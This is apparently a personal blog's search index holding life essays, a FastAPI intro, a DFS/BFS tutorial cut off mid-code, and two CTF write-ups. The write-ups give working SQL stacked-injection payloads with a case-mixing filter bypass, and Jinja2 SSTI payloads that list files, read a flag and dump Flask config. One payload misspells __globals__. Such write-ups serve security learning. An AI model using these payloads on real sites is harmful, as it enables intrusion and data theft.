<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>开学前随笔</title>
    <link href="/2023/08/31/%E5%BC%80%E5%AD%A6%E5%89%8D%E9%9A%8F%E7%AC%94/"/>
    <url>/2023/08/31/%E5%BC%80%E5%AD%A6%E5%89%8D%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<p>现在是2023年的8月31日的深夜，可能写完这篇文章就进入9月了。</p><p>随着下午最后一把apex的结束，大家开始各忙各的，突然也反应过来，大学生活就这么结束了，再过几天就要开启研究生的生活了。</p><p>好在最后几个月没有疫情的大学生活也算过得充实，也过了一个可能是最后一个无忧无虑的暑假，就像小学初中一样。</p><p>毕业后先去了云南旅游，去了丽江，大理，腾冲。这是第一次去京津冀以外的地方，虽然很累但玩得也很开心，现在恍惚觉得，以后和同学们出去旅游这样的机会很少有了。</p><p>在云南最后几天得了肠胃炎，非常难受，回来后在家养病养了一段时间。</p><p>然后开始了减肥和推单机游戏。</p><p>到现在为止大概减了快10斤吧，虽然BMI还是肥胖，去云南的这一趟也让我知道了我的身体有多弱。</p><p>游戏推完了死亡搁浅，瓦国服开了蹭了蹭热度，打了打R6, 又推了推看门狗2还有老滚5，但没有推完，就像暑假也没有出来的CS2一样，充满了遗憾。</p><p>同时也学了学Golang,分布式系统，pwn的一些入门的东西，聊胜于无。</p><p>从这儿之后可能又要忙很长一段时间，感觉毕业后的时间过得好快。</p><p>哎，希望开学后的研究生生活能够一切顺利吧。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>FastApi入门</title>
    <link href="/2023/05/04/FastAPI%E5%85%A5%E9%97%A8/"/>
    <url>/2023/05/04/FastAPI%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="简介-抄的官网"><a href="#简介-抄的官网" class="headerlink" title="简介 (抄的官网)"></a>简介 (抄的官网)</h2><p>FastAPI是一个现代的、快速（高性能）的网络框架，用于在标准Python类型提示的基础上用Python 3.7+构建API。</p><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><h4 id="快速："><a href="#快速：" class="headerlink" title="快速："></a>快速：</h4><p>可与 NodeJS 和 Go 比肩的极高性能（归功于 Starlette 和 Pydantic），是最快的 Python web 框架之一</p><h4 id="高效编码"><a href="#高效编码" class="headerlink" title="高效编码"></a>高效编码</h4><p>提高功能开发速度约 200％ 至 300％</p><h4 id="更少的bug"><a href="#更少的bug" class="headerlink" title="更少的bug"></a>更少的bug</h4><p>减少约 40％ 的人为（开发者）导致错误</p><h4 id="使用方便"><a href="#使用方便" class="headerlink" title="使用方便"></a>使用方便</h4><p>极佳的编辑器支持。处处皆可自动补全，减少调试时间</p><h4 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h4><p>设计的易于使用和学习，阅读文档的时间更短</p><h4 id="简短"><a href="#简短" class="headerlink" title="简短"></a>简短</h4><p>使代码重复最小化。通过不同的参数声明实现丰富功能</p><h4 id="鲁棒性"><a href="#鲁棒性" class="headerlink" title="鲁棒性"></a>鲁棒性</h4><p>prod级别的代码。还有自动生成的交互式文档。</p><h4 id="基于标准"><a href="#基于标准" class="headerlink" title="基于标准"></a>基于标准</h4><p>基于（并与）API的开放标准完全兼容：<a href="https://github.com/OAI/OpenAPI-Specification">OpenAPI</a> (previously known as Swagger) and <a href="https://json-schema.org/">JSON Schema</a>.</p>]]></content>
    
    
    <categories>
      
      <category>框架</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022review</title>
    <link href="/2022/12/31/2022review/"/>
    <url>/2022/12/31/2022review/</url>
    
    <content type="html"><![CDATA[<p>随着2022年1月买的服务器到期，我把这一年所写的东西全部迁了出来，放到github上了。也趁此机会写个年终总结吧。</p><p>提笔写的时候在看Asoul的直播，写完估计已经到了2023年了。2022年发生的事情太多了，确实很值得去写个总结去纪念一下。</p><h3 id="保研"><a href="#保研" class="headerlink" title="保研"></a>保研</h3><p>保研可能是贯穿2022年的主线吧，从正常来说，从2022年的1月份就应该开始了，但可惜我1月份的时候什么都不懂。3月份开学进学校，可能到5月份才搞懂什么是真正的保研，这样直到9月份走了很多很多的弯路，在路途中也emo了很久很久。对于保研很具体的感悟就可以看另一篇保研的博客吧。</p><h3 id="实习"><a href="#实习" class="headerlink" title="实习"></a>实习</h3><p>在保研后，尝试去找了实习。在实习中也再次认识到了现在就业形势的严峻。因为是刚保研完，没有准备什么多久，就投了认为开始投了很多家，但是都没有回应。</p><p>字节给了面试，但可惜，一面就挂了，面评也很不好，所以再投都直接简历挂了。</p><p>然后就是面试了美团，靠的是室友直接进行的内推，主管人很好，也确实缺人，两轮面试就直接过了。但很不幸，刚接完了offer，第二天就立刻出现了疫情，不能进京。联想到后面的事情，其实也算是一种幸运吧。开始了线上的实习，主要写前端Vue。线上实习很舒服，不需要租房的费用，不需要通勤，不需要花钱去吃饭。北京疫情封锁，再北京实习的很多人都处于吃不上饭的状态，然后戏剧性的放开，北京基本所有的人都阳了。我因为线上的实习躲过了这两拨，虽然最后也还是阳了，但是很庆幸躲过了这几波。但是随着大部分人的阳康，过几天也要去线下办公了。组内的员工都是老员工，至少线上的时候体验非常不错，还是期待一波线下吧。</p><h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3><p>2022的上半年因为准备保研的关系，基本每天没有打游戏的时间。保研由于有了工资，陈趁着秋促和冬促入手了不少的游戏，也玩了很多。 战雷一直在玩，到了今年结束的时候把很难开的中系陆战开到了顶级房，用99A把KD打正。然后迷上了空战，中系的空战也开到了J7E，在打的过程中也在录屏收集素材，打算做个击杀集锦，看来只能过两天再说了。</p><p>单机的游戏，今年玩的体验最深的有2款游戏，冰汽时代，赛博朋克2077。</p><p>冰汽时代是在封城的时候玩的，也算很有感触吧，开始对于越界的争议，到后来评价的转变尤其是联想到疫情再有steam下面的评论，都很值得去思考。我们成功的躲过了风暴，我不知道这是否值得，但我庆幸我自己生存了下来。</p><p>2077与刚出时的对比现在能算上是一个合格的大作了，虽然还是有很多的bug。但剧情人设背景非常优秀，以及作为一个RPG游戏的打击感，做的本土化配音也十分的优秀，很沉浸。2077也许能做的更好吧，这种优秀的世界观的设定，总让人有无限的遐想。</p><h3 id="二次元"><a href="#二次元" class="headerlink" title="二次元"></a>二次元</h3><p>什么是二次元呢，V圈也算二次元吧（。</p><p>2022的上半年有在推猫雷，后来出现了y&gt;b事件后，就渐渐脱粉了，虽然确实猫雷很可爱，声音也很好听，再后来猫雷毕业了，据说是转生了，后来也就没再继续关注了。</p><p>当然同时也一直又在看A，一起经历了510事件，在这个过程中认识到了公众舆论被误导的后果。虽然我不是团推没有受到珈乐休眠的多少影响，但看到她们被攻击还是挺伤心的。好在后来2周年也成功的举办了，舆论的封口也回转了，我也一起与Asoul度过了2022。2022年的许多欢乐都是嘉然向晚她们带来的，很感谢她们，希望2023年能继续陪伴。</p><p>除了皮套人外，也补了不少的动漫，一些经典的作品 例如巨人，鬼灭。也在闲暇的时候看完了，也很庆幸今年10月新番非常给力，死神让我找回了初中小学时的感觉。还有非常好看的电锯人，孤独摇滚。</p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>在这一年里，我也干了其他很多事吧。和同学一起去健身，在保研的空隙去爬二期的山，去开无人机。去参加夜跑活动等等等等。也在空余的时间学了一些Pr剪了一些的视频。基本属于最简单的剪辑了，也发到了b站上面。这两天也打算剪几个高级点费时费力的混剪hhh，希望播放量能够高点。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2022年经历的事情有很多，经历了保研和找实习的磨练，我感觉我的社交能力也渐渐有了些增长，渐渐地也不那么社恐了，自己的心理素质有了很大的提升。我感觉这就是很大的成长吧。发邮件联系老师，参加很多轮的面试。</p><p>虽然因为社恐和口才差吃了很多亏，好在最后也有了一个不错的结果，最重要的是在这一年成长了许多。感谢2022年遇到的人和事让我有了这些的成长吧。希望2023年能一切顺利。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>保研随笔</title>
    <link href="/2022/12/30/%E4%BF%9D%E7%A0%94%E9%9A%8F%E7%AC%94/"/>
    <url>/2022/12/30/%E4%BF%9D%E7%A0%94%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<p>当写下这篇文章时，已经是10月8日晚上了，距离928已经过去了一周有余，还是打算用文字来记录一下吧。</p><p>故事有点长，都不知道从哪里写起了，这将近半年中虽然收到了很多很多人的帮助，但还是走了很多的弯路。</p><p>从3月份开始说吧，假期和L佬商量好看能不能，从容易的CV方向，写个在投论文，能对保研有帮助。可惜3月份的我啥也不懂，虽然可能知道，有一篇哪怕在投在夏令营都是乱杀，但我把大部分时间花费在了机试和专业课程上。</p><p>专业课程中，接了Y老师一个小项目，Y老师也邀请我做一些科研。这样，我同时接下了两个大活吧，我以为我都能做好，但事实证明，人的精力是有限的，想同时把多方面做好是很困难的，所以结果是项目寄+论文寄，g++。</p><p>5月份，q上岸了tju，应该是我们这届最早上岸了的吧hhhh。顿时感到十分焦虑，开始四处问学长，搜集信息，和一起保研的同学交流，感谢学长学姐们的无私分享，也算基本搞清楚保研大概是咋回事了。</p><p>6月赶着回家前考了六级和CSP，宅在家中正式开始夏令营。</p><h3 id="夏令营日寄"><a href="#夏令营日寄" class="headerlink" title="夏令营日寄"></a>夏令营日寄</h3><p>总得来说，夏令营我的投递策略是彻彻底底的失误。我非常想去北京（是廊坊人的执念嘛hhhh），所以特别地投递了这些学校，而没有投递一些中久保底。<br>抛开没有入营的，大概说一说面了的学校吧，由于各种协议，就不说具体问题了。</p><h4 id="BUAA"><a href="#BUAA" class="headerlink" title="BUAA"></a>BUAA</h4><p>第一个参加的是buaa吧，buaa非常喜欢打ACM强的学生，可惜，我不是。<br>机试是2道大模拟，OI赛制，我第一题应该是做出来了，但没时间调整输出的格式，所以爆零了。</p><p>对，我为什么要参加机试，我不是考了CSP了吗，但当初报名的时候，我编程语言选的ALL，而buaa要求C&#x2F;C++，（虽然我CSP也全用C&#x2F;C++写的</p><p>buaa的面试，很硬核，政治数学专业课，我面得中规中距吧，被老师cue了说话带东北味hhh，在大连呆得时间长了呢。</p><p>当晚出结果，机试爆0理所当然，wl都没进，寄。</p><h4 id="RUC"><a href="#RUC" class="headerlink" title="RUC"></a>RUC</h4><p>信院也有机试，CSP不要要求语言，可以抵，但我很心高气傲的，觉得我当场发挥能更好，结果自然是寄。</p><p>信院的面试应该是我所有面试中面得最差的一次了，英语问题磕磕绊绊，专业问题名词没有听过，整体呈现了一个很不自信的状态。</p><p>wl都没进，寄。</p><h4 id="SJTU"><a href="#SJTU" class="headerlink" title="SJTU"></a>SJTU</h4><p>电院网安，没有机试。面试三个专业问题，回答上来两个，一个真的从来没有接触过。老师虽然很友善但，好像很嫌弃我没有论文（哭），最后是候补，927最后候补给了专硕，sjtu专硕没住宿而且很贵，加上发邮件的时候正好午休（，所以也直接拒了。</p><h4 id="信工所"><a href="#信工所" class="headerlink" title="信工所"></a>信工所</h4><p>信工所本来认为是稳拿的offer,但同上，当时心高气傲，非得要面一个强导，面了两轮。面试主要是追问项目问题，但也会夹杂一些专业问题，一个扩展欧几里得定理没有答出，进了wl，到最后也没有接到候补的消息。</p><p>综上，夏令营结束为0offer，但我还是天真地以为能够候补上，于是中间小摆了一段时间，然后不知不觉来到预推免。</p><h3 id="预推免日寄"><a href="#预推免日寄" class="headerlink" title="预推免日寄"></a>预推免日寄</h3><p>来到9月份，候补一点消息都没有，彻彻底底慌了，恐怕真的没有学上，好在最后还是有了offer,写写最终去向和印象特别深的吧。</p><h4 id="软件所"><a href="#软件所" class="headerlink" title="软件所"></a>软件所</h4><p>面试软件所感觉也是比较差，（面几个学校没有面试发挥超常的，也是主要问的专业问题。也不知道当时太困，还是啥原因，RSA居然没有答出来。唉，好在最后还是给了offer，也定为最终去向了。</p><h4 id="fdu"><a href="#fdu" class="headerlink" title="fdu"></a>fdu</h4><p>fdu的面试非常麻烦，分了三天，分别机试，英语，专业面。机试又是oi赛制，草，讨厌oi赛制，面试的时候老师说机试很不理想，我第一题就是0分。专业面试感觉是压力面，让我讲讲我的项目，但讲完把项目简单化，老师感觉非常看不起我（哭），结果又是wl都没有，寄。</p><h3 id="后记-amp-感悟"><a href="#后记-amp-感悟" class="headerlink" title="后记&amp;感悟"></a>后记&amp;感悟</h3><p>随着928的到来，一切也都尘埃落定。我感觉今年的状况，捡漏的性价比是越来越高了，看到绿裙很多群友捡漏上了华五。</p><p>虽然走了很多的弯路，但好在最后offer去了自己想去的城市，能够做想做的方向。</p><p>人的命运，在不到半小时的时间里，被老师可能随便问得几个问题决定了。</p><p>我本来就是一个比较内向的人，不是非常擅长交际，这也可能是面试多次失败的原因之一吧。</p><p>大学这几年，因为保研和我的性格，错失了很多东西。但随着一路走来，我也在不断成长吧，从最开始发邮件，开摄像头的都十分害怕的我，到现在也算能适应这种交际了吧。</p><p>有时很羡慕别人的经历，有的从大一就开始科研，最终去了top2强组，能够拿到上万的奖学金。有的很早轻松推荐上岸，在南方实习，能够欣赏江南的美景。有的人善于社会工作，能够认识很多很多的人。</p><p>或许这也是命运吧，从很早的某一个选择起，从很早的一件事情开始，人的差异便逐渐产生了，最终决定了各自的命运。</p><p>但仔细想想，沿途走来，我也在不断成长，收获颇丰，圈子虽然很小，但认识的都是非常非常好的人。</p><p>可能保研过来最大的收获，就是成长与心态的改变吧。</p><p>人各有命</p><p>但并不影响我们各自精彩</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2022/12/30/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/12/30/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>常用的注入，有联合注入与堆叠注入。<br>联合注入即为 1’ or 1 union 注入语句#<br>堆叠注入即为 1’ or 1；注入语句#<br>注入中的预编译方法：<br>set是设置一个新列<br>prepare是进行定义一个语句<br>execute是执行<br>playload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-variable">@sql</span> <span class="hljs-operator">=</span> CONCAT(<span class="hljs-string">&#x27;se&#x27;</span>,<span class="hljs-string">&#x27;lect * from `1919810931114514`;&#x27;</span>);<span class="hljs-keyword">prepare</span> stmt <span class="hljs-keyword">from</span> <span class="hljs-variable">@sql</span>;<span class="hljs-keyword">EXECUTE</span> stmt;<br></code></pre></td></tr></table></figure><p>若遇到区分大小写等，如这里用strstr函数过滤了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sEt</span> <span class="hljs-variable">@sql</span> <span class="hljs-operator">=</span> CONCAT(<span class="hljs-string">&#x27;se&#x27;</span>,<span class="hljs-string">&#x27;lect * from `1919810931114514`;&#x27;</span>);<span class="hljs-keyword">prEpare</span> stmt <span class="hljs-keyword">from</span> <span class="hljs-variable">@sql</span>;<span class="hljs-keyword">EXECUTE</span> stmt;#<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssti模板注入</title>
    <link href="/2022/12/30/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/12/30/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是ssti模板注入"><a href="#什么是ssti模板注入" class="headerlink" title="什么是ssti模板注入"></a>什么是ssti模板注入</h2><p>SSTI就是服务器端模板注入(Server-Side Template Injection)。<br>render_template渲染函数的问题，是引发该问题的原因。渲染函数在渲染的时候，往往对用户输入的变量不做渲染。<br>例如，在flask框架中，Jinjia2模板引擎将</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><p>包裹的当成变量解析替换。</p><h2 id="常用模板引擎"><a href="#常用模板引擎" class="headerlink" title="常用模板引擎"></a>常用模板引擎</h2><p>网站模板引擎有jinja2、tornado、smarty、twig等等，那么如何判断遇到的是哪种类型，常用图如下。<br><img src="/upload/2022/04/image-c3234947943c4932ad036e47e3c54013.png" alt="image.png"></p><h2 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h2><p>__class__用来查看变量所属的类<br>__bases__用来查看类的基类。<br><strong>subclasses</strong>()查看当前类的子类。<br><strong>init</strong> 初始化类，返回的类型是function<br><strong>globals</strong> 获取function所处空间下可使用的module、方法以及所有变量。<br>操作例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;//爆出所有能用的类。<br><br></code></pre></td></tr></table></figure><h2 id="Flask特有的变量和函数。"><a href="#Flask特有的变量和函数。" class="headerlink" title="Flask特有的变量和函数。"></a>Flask特有的变量和函数。</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>config 对象就是Flask的config对象，也就是 app.config 对象</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p> Flask中代表当前请求的request对象<br>###session<br> Flask的session对象<br>###url_for()<br>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接</p><p>###get_flashed_messages()<br>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉。<br>例题：<br>1.XCTF：Web_python_template_injection<br><img src="/upload/2022/04/image-46c662b8394e48f6a26e8b6bfb721742.png" alt="image.png"><br>Jinjia模板，可以ssti注入。<br>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure><p>查出所有的类。<br>使用第72个site._Printer类（可以进行命令执行）<br>使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()<br>[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].listdir(<span class="hljs-string">&#x27;.&#x27;</span>)&#125;&#125;<br>列出所有文件<br></code></pre></td></tr></table></figure><p><img src="/upload/2022/04/image-b563824f1043400b9aa52c2bc7f7913b.png" alt="image.png"></p><p>然后，使用[40]的file类，得到flag。<br><img src="/4" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;fl4g&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>拿到flag.<br><img src="/upload/2022/04/image-577cfcb34d334702bfa27c86cfaac773.png" alt="image.png"></p><p>2.xctf shrine<br>进入查看源码。<br><img src="/upload/2022/04/image-bfa04c70a0c846b181d4211d604999e1.png" alt="image.png"></p><p>源码审计，测试&#x2F;shrine&#x2F;下有回显，但发现过滤 config变量和 self。并且会去除单边括号，所以上题方法失效了。<br>使用url_for函数。<br>url_for.__globals__获取全部全局变量。<br><img src="/upload/2022/04/image-99fc2228abed493ca61310c8b7f2ef85.png" alt="image.png"><br>然后找到app<br>构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__gloabls__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br></code></pre></td></tr></table></figure><p>输入发现flag。<br><img src="/upload/2022/04/image-b563824f1043400b9aa52c2bc7f7913b.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>深度优先搜索和广度优先搜索</title>
    <link href="/2022/12/30/DFSBFS/"/>
    <url>/2022/12/30/DFSBFS/</url>
    
    <content type="html"><![CDATA[<p>深度优先搜索和广度优先搜索。</p><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><p>以输出排列数为例，主要进行状态的转移。</p><h4 id="输出排列数https-www-acwing-com-activity-content-problem-content-905"><a href="#输出排列数https-www-acwing-com-activity-content-problem-content-905" class="headerlink" title="输出排列数https://www.acwing.com/activity/content/problem/content/905/"></a>输出排列数<a href="https://www.acwing.com/activity/content/problem/content/905/">https://www.acwing.com/activity/content/problem/content/905/</a></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> path[N];<br>vector&lt;<span class="hljs-type">bool</span>&gt;<span class="hljs-built_in">vis</span>(N);<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><span class="hljs-comment">//n表示要搜索的位数。</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(u==n)<span class="hljs-comment">//搜索到了第n位</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)cout&lt;&lt;path[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<span class="hljs-comment">//对排列进行输出。</span><br>        cout&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<span class="hljs-comment">//对所有数进行遍历。</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(!vis[i])<span class="hljs-comment">//如果数没有被访问过，即数没有被用在排列中。</span><br>            &#123;<br>                path[u] = i;<span class="hljs-comment">//进行排列</span><br>                vis[i] = <span class="hljs-literal">true</span>;<span class="hljs-comment">//更新数的选择状态。</span><br>                <span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>);<span class="hljs-comment">//对下一位进行搜索</span><br>                vis[i] = <span class="hljs-literal">false</span>;<span class="hljs-comment">//回溯之前的状态。</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>dfs也常用来进行暴力搜索，再数据量较小的情况下，对所有情况取值进行枚举进行搜索，通常根据题目情况配合回溯剪枝减小题目复杂度。<br>例题：<br><a href="https://leetcode.cn/problems/partition-to-k-equal-sum-subsets/">https://leetcode.cn/problems/partition-to-k-equal-sum-subsets/</a><br><a href="https://leetcode.cn/problems/find-minimum-time-to-finish-all-jobs/">https://leetcode.cn/problems/find-minimum-time-to-finish-all-jobs/</a><br><a href="https://leetcode.cn/problems/matchsticks-to-square/">https://leetcode.cn/problems/matchsticks-to-square/</a><br>该三道题的代码思路大致相同，都是均分后，暴搜看能否搜索到正好满足的情况。<br>常用剪枝。<br>在搜索前进行情况判断，若已经不满足则不再进行后续搜索。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(conditon) <span class="hljs-built_in">dfs</span>();<br></code></pre></td></tr></table></figure><p>若回溯后，该组为值为0,后续无论如何搜索也不能得到有意义的答案，直接返回，不进行后续搜索。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(sun[i]==<span class="hljs-number">0</span>)<span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt;sum;<br>    <span class="hljs-type">int</span> k;<br>    vector&lt;<span class="hljs-type">int</span>&gt;jobs;<br>    <span class="hljs-type">int</span> ans;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(idx==jobs.<span class="hljs-built_in">size</span>())<br>        &#123;<br>            <span class="hljs-type">int</span> mx =<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<br>            &#123;<br>                mx =<span class="hljs-built_in">max</span>(mx,sum[i]);<br>            &#125;<br>            ans =<span class="hljs-built_in">min</span>(ans,mx);<br>            <span class="hljs-keyword">return</span> ;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<br>        &#123;<br>            sum[i]+=jobs[idx];<br>            <span class="hljs-keyword">if</span>(sum[i]&lt;ans)<span class="hljs-comment">//剪枝</span><br>            &#123;<br>                <span class="hljs-built_in">dfs</span>(idx+<span class="hljs-number">1</span>);<br>            &#125;<br>            sum[i]-=jobs[idx];<br>            <span class="hljs-keyword">if</span>(sum[i]==<span class="hljs-number">0</span>)<span class="hljs-comment">//剪枝</span><br>            &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minimumTimeRequired</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; jobs, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">sum</span>(<span class="hljs-number">12</span>,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">this</span>-&gt;sum = sum;<br>        <span class="hljs-keyword">this</span>-&gt;k = k;<br>        <span class="hljs-built_in">sort</span>(jobs.<span class="hljs-built_in">begin</span>(),jobs.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">this</span>-&gt;jobs =jobs;<br>        ans =<span class="hljs-number">1e9</span>;<br>        <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="n-皇后问题"><a href="#n-皇后问题" class="headerlink" title="n-皇后问题"></a>n-皇后问题</h4><p><a href="https://www.acwing.com/activity/content/problem/content/906/">https://www.acwing.com/activity/content/problem/content/906/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 